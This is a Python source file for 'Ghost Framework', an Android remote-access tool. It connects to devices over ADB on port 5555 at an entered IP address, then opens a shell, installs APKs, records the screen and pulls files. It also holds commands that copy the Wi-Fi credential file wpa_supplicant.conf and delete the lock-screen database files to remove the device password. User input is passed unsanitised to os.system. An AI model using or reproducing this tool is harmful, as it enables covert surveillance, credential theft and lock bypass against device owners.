#-*- coding: utf-8 -*-

# Copyright (C) 2016 - 2019 Entynetproject
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may not
# use the software except in compliance with the License.
#
# You may obtain a copy of the License at:
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations under
# the License.

#=============================
#Imports
import os
import sys
import readline
import random
import time as  t

reload(sys)
sys.setdefaultencoding("utf-8")

def autocomplete(text, state):
    import readline
    line = readline.get_line_buffer()
    splitted = line.lstrip().split(" ")

    # no space, autocomplete will be the basic commands:
    options = [x + " " for x in actions if x.startswith(text)]
    options.extend([x + " " for x in remap if x.startswith(text)])
    try:
        return options[state]
    except:
        return None

def get_input(prompt, auto_complete_fn=None, basefile_fn=None):
    try:
        if auto_complete_fn != None:
            import readline
            readline.set_completer_delims(' \t\n;/')
            readline.parse_and_bind("tab: complete")
            readline.set_completer(auto_complete_fn)
    except Exception as e:
        pass

    cmd = raw_input("%s" % prompt)
    return cmd.strip()

#=============================
# Variables
CurrentDir = os.path.dirname(os.path.abspath(__file__))
readline.set_completer(autocomplete)
readline.parse_and_bind("tab: complete")
WHSL = '\033[0;97m'
ENDL = '\033[0m'
REDL = '\033[0;31m'
GNSL = '\033[0;32m'
load_count = 0
page2 = False

#=============================
#Install Functions
# def ColoringModeStartup():
#     coloring_file = open(CurrentDir+"\\install\\coloring.txt", "a+")
#     line = open(CurrentDir+"\\install\\coloring.txt", "a+").readline()
#     if 'init' in line:
#         init(convert=True)
#         main()
#     if 'false' in line:
#         main()
#     if "NOT_LOADED" in line:
#         platform_choice = raw_input("Are you loading this script in (W)indows or (L)inux: ")
#         open(CurrentDir+"\\install\\coloring.txt", "w").close()
#         if platform_choice.lower() == 'w':
#             coloring_file.write("init")
#         else:
#             coloring_file.write("false")
#             yn = raw_input(WHSL + "Have you already installed adb via command line "+GNSL + "Y"+WHSL+"/"+REDL+"N "+WHSL)
#             if yn == "n":
#                 os.system("sudo apt install adb")
#             else:
#                 main()

#=============================

arrow = REDL + "   └──>".decode("utf-8").strip() + WHSL
arrow = str(" "+arrow)
connect = REDL + "│".decode("utf-8").strip() + WHSL

page_1 = '''{2} 
      .-.            {0}[{1}Ghost Framework{0}]{2}
    .'   `.       {0}({1}Android Remote Access{0}){2}
    :0 0   :    {2}Developed by Entynetproject{2}
    : o    `.             
   :         ``.               {0}[{1}1{0}] {2}Show connected devices
  :             `.             {0}[{1}2{0}] {2}Disconect all devices
 :  :         .   `.           {0}[{1}3{0}] {2}Connect a new device
 :   :          ` . `.         {0}[{1}4{0}] {2}Access device shell
  `.. :            `. ``;      {0}[{1}5{0}] {2}Install an apk on a device
     `:;             `:'       {0}[{1}6{0}] {2}Screen record a device
        :              `.      {0}[{1}7{0}] {2}Get device screenshot
         `.              `.    {0}[{1}8{0}] {2}Restart Ghost Server
           `'`'`'`---..,___`.  {0}[{1}9{0}] {2}Pull files from device       
                     
 {0}[{1}10{0}] {2}Shutdown the device      {0}[{1}19{0}]{2} Extract apk from app                         
 {0}[{1}11{0}] {2}Uninstall an app         {0}[{1}20{0}]{2} Get Battery Status
 {0}[{1}12{0}] {2}Show device log          {0}[{1}21{0}]{2} Get Network Status
 {0}[{1}13{0}] {2}Dump System Info         {0}[{1}22{0}]{2} Turn WiFi on/off
 {0}[{1}14{0}] {2}List all device apps     {0}[{1}23{0}]{2} Remove device password
 {0}[{1}15{0}] {2}Run a device app         {0}[{1}24{0}]{2} Emulate button presses
 {0}[{1}16{0}]{2} Port Forwarding          {0}[{1}25{0}]{2} Get Current Activity
 {0}[{1}17{0}]{2} Grab wpa_supplicant      {0}[{1}26{0}]{2} Update Ghost Framework
 {0}[{1}18{0}]{2} Show Mac/Inet            {0}[{1}27{0}]{2} Exit Ghost Framework
'''.format(GNSL, REDL, WHSL)

page_2 = '''\n
'''.format(GNSL, REDL, WHSL)


#=============================
#Main
def main():
    page_num = 1
    option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")
        
    while(1):
        
        if option == '1':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb devices -l")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option  ==  '2':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb disconnect")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '3':
            print (("\n{1}[{0}+{1}]{2} Enter a device IP address.").format(REDL, GNSL, WHSL))
            try:
                device_name = raw_input (arrow+" ghost"+GNSL+"("+REDL + "connect_device" + GNSL + ")"+WHSL + "> ")
            except KeyboardInterrupt:
                main()
            if device_name == '':
                main()
            if device_name == '27':
                main()
                
            os.system("adb connect "+device_name+":5555")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option  == '4':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+" shell")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '5':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print (("     "+connect))
            print (("    {1}[{0}+{1}]{2} Enter the apk location.").format(REDL, GNSL, WHSL))
            apk_location = raw_input("    "+arrow + " ghost"+GNSL+"("+REDL + "apk_install" + GNSL + ")"+WHSL + "> ")
            os.system("adb -s  "+device_name+" install "+apk_location)
            print (GNSL  +  "Apk has been installed.")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option ==  '6':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print (("     "+connect))
            print (("    {1}[{0}+{1}]{2} Video recording started.").format(REDL, GNSL, WHSL))
            print (("     "+connect))
            os.system("adb -s "+device_name+" shell screenrecord /sdcard/screen.mp4")
            print (("    {1}[{0}+{1}]{2} Enter where you would like to save the video.").format(REDL, GNSL, WHSL))
            place_location = raw_input("    "+arrow + " ghost"+GNSL+"("+REDL + "screen_record" + GNSL + ")"+WHSL + "> ")
            os.system("adb -s "+device_name+" pull /sdcard/screen.mp4 "+place_location)
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option  == '7':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+" shell screencap /sdcard/screen.png")
            print (("     "+connect))
            print (("    {1}[{0}+{1}]{2} Enter where you would like to save the screenshot.").format(REDL, GNSL, WHSL))
            place_location = raw_input("    "+arrow + " ghost"+GNSL+"("+REDL + "screenshot" + GNSL + ")"+WHSL + "> ")
            os.system("adb -s "+device_name+" pull /sdcard/screen.png "+place_location)
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '8':
            os.system("adb kill-server && adb start-server")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '9':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print (("     "+connect))
            print (("    {1}[{0}+{1}]{2} Enter a file location on a device.").format(REDL, GNSL, WHSL))
            file_location = raw_input("    "+arrow + " ghost"+GNSL+"("+REDL + "file_pull" + GNSL + ")"+WHSL + "> ")
            print (("        "+connect))
            print (("       {1}[{0}+{1}]{2} Enter where you would like to save the file.").format(REDL, GNSL, WHSL))
            place_location = raw_input("       "+arrow + " ghost"+GNSL+"("+REDL + "file_pull" + GNSL + ")"+WHSL + "> ")
            os.system("adb -s "+device_name+" pull "+file_location+" "+place_location)
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '10':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+ " reboot ")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option ==  '11':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print (("     "+connect))
            print (("    {1}[{0}+{1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = raw_input("    "+arrow + " ghost"+GNSL+"("+REDL + "app_delete" + GNSL + ")"+WHSL + "> ")
            os.system("adb -s "+device_name+" unistall "+package_name)
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '12':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system('adb -s '+device_name+" logcat ")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '13':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+" shell dumpsys")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '14':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell pm list packages -f")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '15':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print (("     "+connect))
            print (("    {1}[{0}+{1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = raw_input("    "+arrow + " ghost"+GNSL+"("+REDL + "app_run" + GNSL + ")"+WHSL + "> ")
            os.system("adb -s "+device_name+" shell monkey -p "+package_name+" -v 500")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '16':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print (("     "+connect))
            print (("    {1}[{0}+{1}]{2} Enter a port on the device.").format(REDL, GNSL, WHSL))
            port_device = raw_input("    "+arrow + " ghost"+GNSL+"("+REDL + "port_forward" + GNSL + ")"+WHSL + "> ")
            print (("         "+connect))
            print (("        {1}[{0}+{1}]{2} Enter a port to forward it too.").format(REDL, GNSL, WHSL))
            forward_port = raw_input("        "+arrow + " ghost"+GNSL+"("+REDL + "port_forward" + GNSL + ")"+WHSL + "> ")
            os.system("adb -s "+device_name+" forward tcp:"+port_device+" tcp:"+forward_port)
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '17':
            try:
                print (("     "+connect))
                print (("    {1}[{0}+{1}]{2} Enter where you would like to save the file.").format(REDL, GNSL, WHSL))
                location = raw_input("    "+arrow + " ghost"+GNSL+"("+REDL + "wpa_grub" + GNSL + ")"+WHSL + "> ")
                os.system("adb -s "+device_name+" shell "+"su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
                os.system("adb -s "+device_name+" pull /sdcard/wpa_supplicant.conf "+location)
                option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

            except KeyboardInterrupt:
                try:
                    device_name
                except:
                    print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                    main()
                    
                option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '18':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell ip address show wlan0")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '19':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print (("     "+connect))
            print (("    {1}[{0}+{1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = raw_input("    "+arrow + " ghost"+GNSL+"("+REDL + "pull_apk" + GNSL + ")"+WHSL + "> ")
            os.system("adb -s "+device_name+" shell pm path "+package_name)
            print (("         "+connect))
            print (("        {1}[{0}+{1}]{2} Enter the path to apk.").format(REDL, GNSL, WHSL))
            path = raw_input("        "+arrow + " ghost"+GNSL+"("+REDL + "pull_apk" + GNSL + ")"+WHSL + "> ")
            print (("             "+connect))
            print (("            {1}[{0}+{1}]{2} Enter The location to store the apk.")  .format(REDL, GNSL, WHSL))
            location =   raw_input("            "+arrow + " ghost"+GNSL+"("+REDL + "pull_apk" + GNSL + ")"+WHSL + "> ")
            os.system("adb -s " +device_name+" pull "+path+" "+location)
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '20':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell dumpsys battery")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '21':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell netstat")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '22':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print (("     "+connect))
            print (("    {1}[{0}+{1}]{2} To turn WiFi back on, you should the device to be Pluged-In.").format(REDL, GNSL, WHSL))
            print (("     "+connect))
            on_off = raw_input(GNSL + "    ["+REDL+"+"+GNSL+"]"+WHSL+" Would you like to turn the WiFi on/off")
            if on_off == 'off':
                command = " shell svc wifi disable"
            else:
                command = " shell svc wifi enable"

            os.system("adb -s "+device_name+command)
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '23':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print (("     "+connect))
            print (REDL + "****************** REMOVING PASSWORD ******************")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
            print (REDL + "****************** REMOVING PASSWORD ******************")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '24':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print ('''
 0   -->  KEYCODE_UNKNOWN
 1   -->  KEYCODE_MENU
 2   -->  KEYCODE_SOFT_RIGHT
 3   -->  KEYCODE_HOME
 4   -->  KEYCODE_BACK
 5   -->  KEYCODE_CALL
 6   -->  KEYCODE_ENDCALL
 7   -->  KEYCODE_0
 8   -->  KEYCODE_1
 9   -->  KEYCODE_2
 10  -->  KEYCODE_3
 11  -->  KEYCODE_4
 12  -->  KEYCODE_5
 13  -->  KEYCODE_6
 14  -->  KEYCODE_7
 15  -->  KEYCODE_8
 16  -->  KEYCODE_9
 17  -->  KEYCODE_STAR
 18  -->  KEYCODE_POUND
 19  -->  KEYCODE_DPAD_UP
 20  -->  KEYCODE_DPAD_DOWN
 21  -->  KEYCODE_DPAD_LEFT
 22  -->  KEYCODE_DPAD_RIGHT
 23  -->  KEYCODE_DPAD_CENTER
 24  -->  KEYCODE_VOLUME_UP
 25  -->  KEYCODE_VOLUME_DOWN
 26  -->  KEYCODE_POWER
 27  -->  KEYCODE_CAMERA
 28  -->  KEYCODE_CLEAR
 29  -->  KEYCODE_A
 30  -->  KEYCODE_B
 31  -->  KEYCODE_C
 32  -->  KEYCODE_D
 33  -->  KEYCODE_E
 34  -->  KEYCODE_F
 35  -->  KEYCODE_G
 36  -->  KEYCODE_H
 37  -->  KEYCODE_I
 38  -->  KEYCODE_J
 39  -->  KEYCODE_K
 40  -->  KEYCODE_L
 41  -->  KEYCODE_M
 42  -->  KEYCODE_N
 43  -->  KEYCODE_O
 44  -->  KEYCODE_P
 45  -->  KEYCODE_Q
 46  -->  KEYCODE_R
 47  -->  KEYCODE_S
 48  -->  KEYCODE_T
 49  -->  KEYCODE_U
 50  -->  KEYCODE_V
 51  -->  KEYCODE_W
 52  -->  KEYCODE_X
 53  -->  KEYCODE_Y
 54  -->  KEYCODE_Z
 55  -->  KEYCODE_COMMA
 56  -->  KEYCODE_PERIOD
 57  -->  KEYCODE_ALT_LEFT
 58  -->  KEYCODE_ALT_RIGHT
 59  -->  KEYCODE_SHIFT_LEFT
 60  -->  KEYCODE_SHIFT_RIGHT
 61  -->  KEYCODE_TAB
 62  -->  KEYCODE_SPACE
 63  -->  KEYCODE_SYM
 64  -->  KEYCODE_EXPLORER
 65  -->  KEYCODE_ENVELOPE
 66  -->  KEYCODE_ENTER
 67  -->  KEYCODE_DEL
 68  -->  KEYCODE_GRAVE
 69  -->  KEYCODE_MINUS
 70  -->  KEYCODE_EQUALS
 71  -->  KEYCODE_LEFT_BRACKET
 72  -->  KEYCODE_RIGHT_BRACKET
 73  -->  KEYCODE_BACKSLASH
 74  -->  KEYCODE_SEMICOLON
 75  -->  KEYCODE_APOSTROPHE
 76  -->  KEYCODE_SLASH
 77  -->  KEYCODE_AT
 78  -->  KEYCODE_NUM
 79  -->  KEYCODE_HEADSETHOOK
 80  -->  KEYCODE_FOCUS
 81  -->  KEYCODE_PLUS
 82  -->  KEYCODE_MENU
 83  -->  KEYCODE_NOTIFICATION
 84  -->  KEYCODE_SEARCH
 85  -->  TAG_LAST_KEYCODE
            ''')
            print (("{1}[{0}+{1}]{2} Enter a keycode option number.").format(REDL, GNSL, WHSL))
            num = raw_input(arrow + " ghost"+GNSL+"("+REDL + "keycode" + GNSL + ")"+WHSL + "> ")
            os.system("adb -s "+device_name+" shell input keyevent "+num)
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '25':
            try:
                device_name
            except:
                print (("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell dumpsys activity")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '26':
            os.system("chmod +x bin/ghost && bin/ghost -u")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

        elif option == '':
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")
            
        elif option == '27':
            os.system("{ adb disconnect; } &> /dev/null")
            print (("{1}[{0}+{1}]{2} Stopping Ghost Server...").format(REDL, GNSL, WHSL))
            t.sleep(5)
            exit()
            break
        else:
            print("ghost: error: invalid command")
            option = raw_input(WHSL + "ghost"+GNSL+"("+REDL + "main_menu" + GNSL + ")"+WHSL + "> ")

    main()

#=============================
#=============================  
# Run

import os
os.system("printf '\033]2;Ghost Framework\a'")
print (("{1}[{0}+{1}]{2} Starting Ghost Server...").format(REDL, GNSL, WHSL))
os.system("{ adb tcpip 5555; } &> /dev/null")
t.sleep(4)
os.system('clear')
print (page_1)
main()
